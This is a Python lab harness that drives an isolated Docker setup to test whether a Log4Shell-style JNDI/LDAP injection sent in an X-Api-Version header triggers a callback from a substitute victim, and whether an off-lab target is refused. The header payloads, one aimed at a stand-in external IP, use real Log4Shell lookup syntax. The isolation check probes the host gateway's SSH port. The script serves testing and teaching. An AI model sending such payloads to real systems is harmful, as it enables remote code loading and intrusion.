#!/usr/bin/env python3
"""Repeatable behavior-acceptance run for the Log4Shell JNDI/LDAP callback (B2).

Brings up the isolated lab, drives the attacker container, and asserts on real
listener evidence. Writes a machine-readable result and tears the lab down.

Verdicts emitted (aligned with module 8 vocabulary and expected.md):
  - callback_behavior: PASS/FAIL  -> did the crafted injection cause an observed
    in-lab callback from the victim, while a benign request caused none?
  - offlab_guard:      PASS/FAIL  -> is a non-lab callback target refused?
This run reproduces ONLY the callback behavior. The full Log4Shell->Horizon
chain remains a teaching substitute (B1) / BLOCKED (Windows-only steps); this
script never claims otherwise.

Usage:  python run.py            # up, test, report, down
        python run.py --keep     # leave the lab running for inspection
labnet is internal (no internet egress, measured each run) and nothing is pulled.
Note: an internal bridge still reaches host-gateway services (a known infra gap);
this lab never uses that path. This run MODELS the callback with a harmless
substitute victim -- it does not reproduce real Log4Shell (no Log4j participates).
"""
from __future__ import annotations

import argparse
import json
import pathlib
import subprocess
import sys
import time
from datetime import datetime, timezone

HERE = pathlib.Path(__file__).resolve().parent
PROJECT = "cr-poc-log4shell"
EVIDENCE = HERE / ".evidence"
COMPOSE = ["docker", "compose", "-p", PROJECT, "-f", str(HERE / "compose.yml")]
CRAFTED = "${jndi:ldap://listener:1389/Exploit}"
OFFLAB = "${jndi:ldap://203.0.113.9:1389/Exploit}"  # TEST-NET-3; unreachable on internal net anyway


def _run(args: list[str], timeout: int = 90) -> subprocess.CompletedProcess:
    return subprocess.run(args, capture_output=True, text=True, timeout=timeout)


def _attacker_request(header_value: str) -> str:
    """Emit one HTTP request from inside the attacker container to the victim."""
    script = (
        "import urllib.request\n"
        "r=urllib.request.Request('http://victim:8080/', headers={'X-Api-Version': %r})\n"
        "print(urllib.request.urlopen(r, timeout=5).read().decode('utf-8','replace'))" % header_value
    )
    result = _run(COMPOSE + ["exec", "-T", "attacker", "python", "-c", script], timeout=30)
    return (result.stdout or result.stderr).strip()


def _callbacks() -> list[dict]:
    log = EVIDENCE / "callbacks.jsonl"
    if not log.exists():
        return []
    out = []
    for line in log.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line:
            try:
                out.append(json.loads(line))
            except json.JSONDecodeError:
                pass
    return out


def _wait_victim(deadline: float) -> bool:
    probe = "import socket; socket.create_connection(('victim',8080),timeout=2).close(); print('ok')"
    while time.time() < deadline:
        r = _run(COMPOSE + ["exec", "-T", "attacker", "python", "-c", probe], timeout=20)
        if "ok" in r.stdout:
            return True
        time.sleep(1.5)
    return False


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--keep", action="store_true", help="do not tear the lab down")
    args = parser.parse_args()

    EVIDENCE.mkdir(exist_ok=True)
    # The listener runs non-root inside a read-only container; make the bind-mounted
    # evidence dir/file writable by its (possibly userns-remapped) uid.
    import os
    os.chmod(EVIDENCE, 0o777)
    # Start each run from a clean callback log so evidence is unambiguous.
    log_path = EVIDENCE / "callbacks.jsonl"
    log_path.write_text("", encoding="utf-8")
    os.chmod(log_path, 0o666)

    result: dict = {"run_at": datetime.now(timezone.utc).isoformat(), "project": PROJECT,
                    "steps": [], "levels": {}, "fidelity": {}}
    try:
        up = _run(COMPOSE + ["up", "-d", "--no-build"], timeout=120)
        if up.returncode != 0:
            result["error"] = "compose up failed: " + up.stderr[-800:]
            print(json.dumps(result, ensure_ascii=False, indent=2))
            return 2

        if not _wait_victim(time.time() + 40):
            result["error"] = "victim did not become reachable from attacker"
            return 2

        # 1) Benign request: must NOT cause a callback.
        before = len(_callbacks())
        benign_resp = _attacker_request("1.0")
        time.sleep(1.0)
        after_benign = _callbacks()
        benign_caused = len(after_benign) > before
        result["steps"].append({"step": "benign_request", "response": benign_resp,
                                "callbacks_after": len(after_benign),
                                "expected": "no callback", "ok": not benign_caused})

        # 2) Crafted injection: MUST cause exactly one in-lab callback from the victim.
        crafted_resp = _attacker_request(CRAFTED)
        time.sleep(1.0)
        after_crafted = _callbacks()
        new_callbacks = after_crafted[len(after_benign):]
        crafted_caused = len(new_callbacks) >= 1
        result["steps"].append({"step": "crafted_injection", "injection": CRAFTED,
                                "response": crafted_resp, "new_callbacks": new_callbacks,
                                "expected": "one callback from victim", "ok": crafted_caused})

        # 3) Off-lab target: must be refused by the victim's allow-list AND (because
        #    labnet is internal) produce no callback.
        before_off = len(_callbacks())
        off_resp = _attacker_request(OFFLAB)
        time.sleep(1.0)
        off_caused = len(_callbacks()) > before_off
        off_refused = "refused-offlab-host" in off_resp
        result["steps"].append({"step": "offlab_target", "injection": OFFLAB, "response": off_resp,
                                "expected": "refused, no callback", "ok": off_refused and not off_caused})

        # 4) Measure actual isolation honestly: internet egress AND host-gateway reach.
        # Derive the bridge gateway from the container's own IPv4 (gateway = .1 of the
        # /24-style subnet in practice), then probe host sshd:22 through it.
        probe = ("import socket\n"
                 "ip=socket.gethostbyname(socket.gethostname())\n"
                 "gw='.'.join(ip.split('.')[:3])+'.1'\n"
                 "def t(h,p):\n"
                 " try:\n  socket.create_connection((h,p),timeout=3).close();return 'REACHED'\n"
                 " except OSError as e:return type(e).__name__\n"
                 "print(repr({'own_ip':ip,'gateway':gw,'inet_8888_53':t('8.8.8.8',53),"
                 "'inet_1111_443':t('1.1.1.1',443),'host_gw_22':t(gw,22)}))")
        eg = _run(COMPOSE + ["exec", "-T", "attacker", "python", "-c", probe], timeout=20).stdout.strip()
        try:
            egress = eval(eg, {"__builtins__": {}})  # trusted: our own probe output
        except Exception:
            egress = {"raw": eg}
        uid = _run(COMPOSE + ["exec", "-T", "attacker", "id", "-u"], timeout=15).stdout.strip()

        callback_ok = (not benign_caused) and crafted_caused and ("lookup-performed" in crafted_resp)
        # This grades the HARNESS, not a Log4Shell reproduction. No Log4j participates,
        # so the real callback is NOT reproduced here (reviewer Q1).
        result["levels"]["harness_callback_observed"] = "PASS" if callback_ok else "FAIL"
        result["levels"]["offlab_guard"] = "PASS" if (off_refused and not off_caused) else "FAIL"
        result["isolation_measured"] = {
            "attacker_uid": uid,
            "egress": egress,
            "note": "internet egress blocked; host-gateway service (sshd:22) is CURRENTLY reachable "
                    "via the bridge gateway -- a known infra isolation gap, not used by this lab.",
        }
        result["fidelity"] = {
            "reproduced": [],
            "modeled_only": "B2 callback OBSERVABLE, via a worker-written harmless SUBSTITUTE victim "
                            "(ASSUMED*SUBSTITUTED). No Log4j participates, so this is a harness/framework "
                            "self-test of the callback-observation path, NOT a reproduction of the real "
                            "Log4Shell callback. Real B2/B1 and Windows-only steps are NOT reproduced.",
            "real_reproduction_requires": "a real vulnerable image (e.g. vulhub solr 8.11.0 / Log4j 2.14.1); "
                            "DEFERRED until the host-isolation gap is fixed and reviewed (see run_real_vuln.md, NOT_TESTED).",
            "safety": "labnet internal:true (no internet egress, measured); attack emitted from attacker "
                      "container only; target and callback confined to in-lab containers; non-root, read-only.",
        }
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0 if callback_ok and result["levels"]["offlab_guard"] == "PASS" else 1
    finally:
        if not args.keep:
            _run(COMPOSE + ["down", "-v", "--remove-orphans"], timeout=60)


if __name__ == "__main__":
    sys.exit(main())
